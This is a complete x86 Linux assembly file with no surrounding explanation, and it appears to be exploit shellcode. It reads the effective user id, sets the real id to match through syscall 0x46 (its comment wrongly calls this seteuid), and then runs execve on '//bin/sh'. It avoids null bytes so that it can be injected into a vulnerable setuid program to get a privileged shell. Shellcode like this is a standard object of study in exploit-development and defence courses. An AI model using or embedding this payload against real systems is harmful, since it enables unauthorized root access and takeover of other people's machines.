#include <sys/syscall.h>

.globl	main
.type	main, @function

main:
//geteuid()
xor %eax, %eax
mov $0x31, %al
int $0x80

//seteuid(geteuid(), geteuid())
mov %eax, %ebx
mov %eax, %ecx
xor %eax, %eax
mov $0x46, %al
int $0x80

//execve("//bin/sh", 0, 0)
xor %eax, %eax
mov $0x0b, %al
xor %ecx, %ecx
xor %edx, %edx
push %edx
push $0x68732f6e
push $0x69622f2f
mov %esp, %ebx
int $0x80
